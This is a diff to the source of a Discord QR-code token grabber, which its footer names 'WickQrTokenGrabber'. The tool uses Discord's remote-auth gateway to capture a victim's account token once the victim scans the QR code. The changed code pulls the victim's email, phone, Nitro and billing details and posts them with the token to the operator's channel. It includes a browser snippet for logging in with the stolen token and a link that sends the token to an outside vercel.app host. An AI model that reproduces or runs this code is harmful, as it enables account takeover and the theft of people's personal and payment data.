@@ -20,28 +20,25 @@ import {
   IPrendingRemoteInit,
 } from "../interfaces/ISocketEvents";
 import { toDataURL } from "qrcode";
-
-const {
-  getAllInfos,
-  getBotToken,
-  guildList,
-  friendList
-} = require("../util/js/fetch");
 import {
   getTicketAxios,
   getTicketWithCaptchaAxios,
-  getUserFriendsAxios,
-  getBillingInformationAxios,
-  getUserInformationAxios,
-  sendMessageAxios,
-  createFriendChannelAxios,
-  sendMessageWithCaptchaAxios,
 } from "../util/axios";
+import {
+  getUserInformation,
+  getBillingInformation,
+  getAllBoosts,
+  addBoostToserver,
+  getAllFriends,
+  createFriendChannel,
+  sendMessage,
+  blockFriend
+} from "../util/fetch";
 import { allSockets, sharedClient } from "..";
 import { CaptchaSolver } from "./CaptchaSolver";
 import { config } from "../util/config";
 import { join } from "path";
-import { IUserInfo } from "../interfaces/IDiscord";
+import { IUser } from "../interfaces/IDiscord";
 import * as embeds from "../util/embeds";
 import * as fs from "fs/promises";
 
@@ -50,7 +47,7 @@ export class DiscordSocket {
   public messages = new Collection<string, any>();
   public socket: WebSocket;
   public keyPair: KeyPairKeyObjectResult;
-  public userInformation: IUserInfo | null = null;
+  public userInformation: IUser | null = null;
 
   constructor(public readonly user: GuildMember) {
     this.socket = new WebSocket("wss://remote-auth-gateway.discord.gg/?v=2", {
@@ -109,63 +106,45 @@ export class DiscordSocket {
   }
 
   private async taskAfterCompletion(_this: DiscordSocket, token: string) {
-    const GetInfos = await getAllInfos(token)
+    try {
+      const getCopy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
+      const getUser = await getUserInformation(token);
+      const getBilling = await getBillingInformation(token);
 
-    const grabbedEmbed = await embeds.foundTokenEmbed();
-    grabbedEmbed.setAuthor({
-      name: `${_this.userInformation?.username!}#${_this.userInformation ?.discriminator!}`,
-      iconURL: _this.userInformation?.avatar !== "0" 
-      ? `${GetInfos.avatar}`
-      : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
-    });
-    grabbedEmbed.addFields([
-      {
-        name: "⚙️ Account Info's Normal", value: 
-        `Email: \`${GetInfos.mail}\`\n`+
-        `Phone: \`${GetInfos.hasPhone}\`\n`+
-        `Nitro: **${GetInfos.nitroType}**\n`+
-        `Billing Info: **${GetInfos.billing}**`
-      },
-      { 
-        name: "⚙️ Account All Info's", value: 
-        `Username: \`${GetInfos.username}\`\n` + 
-        `ID: \`${GetInfos.ID}\`\n` +
-        `Badges: **${GetInfos.badges}**\n` +
-        `Nitro-Type: **${GetInfos.nitroType}**\n` +
-        `Billing: **${GetInfos.billing}**\n` +
-        `Friends: \`${GetInfos.totalFriend}\`\n` +
-        `Blocked: \`${GetInfos.totalBlocked}\`\n` +
-        `Servers: \`${GetInfos.totalGuild}\`\n` +
-        `Owned-Servers: \`${GetInfos.totalOwnedGuild}\`\n` +
-        `BOT'S / NPC'S: \`${GetInfos.totalApplication}\`\n` +
-        `Connections: \`${GetInfos.totalConnection}\`\n` +
-        `NSFWAllowed: **${GetInfos.NSFWAllowed}**\n` +
-        `Status: **${GetInfos.status}**\n` +
-        `Gifts: **${GetInfos.Gifts}**\n` +
-        `Biography: \`\`\`\n${GetInfos.hasBio}\n\`\`\`\n` 
-      },
-      { 
-        name: "⚙️ Account All Friend's",
-        value: `**${GetInfos.rareFriend}**`
-      },
-      { 
-        name: "⚙️ Code to login",
-        value: `\`\`\`js\n(\n    function() {\n        window.t=\"${token}\";\n        window.localStorage=document.body.appendChild(document.createElement \`iframe\`).contentWindow.localStorage;\n        window.setInterval(() => window.localStorage.token=\`\"\${window.t}\"\`);\n        window.location.reload();\n    }\n)();\`\`\``
-      },
-      { 
-        name: "💰 Found Token",
-        value: `||**${token}**||`
-      },
-    ]);
-    grabbedEmbed.setFooter({
-      text: `https://github.com/k4itrun/WickQrTokenGrabber`,
-      iconURL: _this.userInformation?.avatar !== "0" 
-      ? `${GetInfos.avatar}`
-      : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
-    });
-    (sharedClient.channel as TextChannel).send({
-      embeds: [grabbedEmbed],
-    });
+      const GRABBER_EMBED = await embeds.foundTokenEmbed();
+
+      GRABBER_EMBED.setAuthor({
+        name: `${_this.userInformation?.username!}#${_this.userInformation?.discriminator!} | ${_this.userInformation?.id!}`,
+        iconURL: _this.userInformation?.avatar !== "0"
+          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.id!}/${_this.userInformation?.avatar!}.png?size=2048`
+          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png?size=2048",
+      });
+
+      GRABBER_EMBED.addFields([
+        { name: "Token:", value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](${getCopy})` },
+        { name: "Nitro:", value: `${getUser.premium_type ? (getUser.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}`, inline: true },
+        { name: "Phone:", value: `${getUser.phone ? getUser.phone : "None"}`, inline: true },
+        { name: "Email:", value: `${getUser.email}`, inline: true },
+        { name: "Billing:", value: `${getBilling.length > 0 ? 'Yes' : 'No'}`, inline: true },
+        { name: "Code to login", value: `\`\`\`js\n` + `function login(token) {\n` + `  setInterval(() => {\n` + `   document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.token = \`"\${token}"\`\n` + `  }, 50);\n` + `  setTimeout(() => {\n` + `    location.reload();\n` + `  }, 2500);\n` + `}\n\n` + `login('${token}')` + `\`\`\`` },
+      ]);
+
+      GRABBER_EMBED.setFooter({
+        text: `https://github.com/k4itrun/WickQrTokenGrabber`,
+        iconURL: _this.userInformation?.avatar !== "0"
+          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.id!}/${_this.userInformation?.avatar!}.png?size=2048`
+          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png?size=2048",
+      });
+
+      (sharedClient.channel as TextChannel).send({
+        embeds: [GRABBER_EMBED],
+      });
+
+      console.log({getUser, getBilling})
+
+    } catch (error) {
+      console.error("Error in taskAfterCompletion:", error);
+    }
   }
 
   private hello(_this: DiscordSocket, messageData: IHello) {
@@ -220,9 +199,9 @@ export class DiscordSocket {
     );
 
     const ticket = decryptedTicket.toString().split(":");
-    const userInformation: IUserInfo = {
-      userid: ticket[0],
-      discriminator: parseInt(ticket[1]),
+    const userInformation: IUser = {
+      id: ticket[0],
+      discriminator: parseInt(ticket[1]).toString(),
       avatar: ticket[2],
       username: ticket[3],
     };
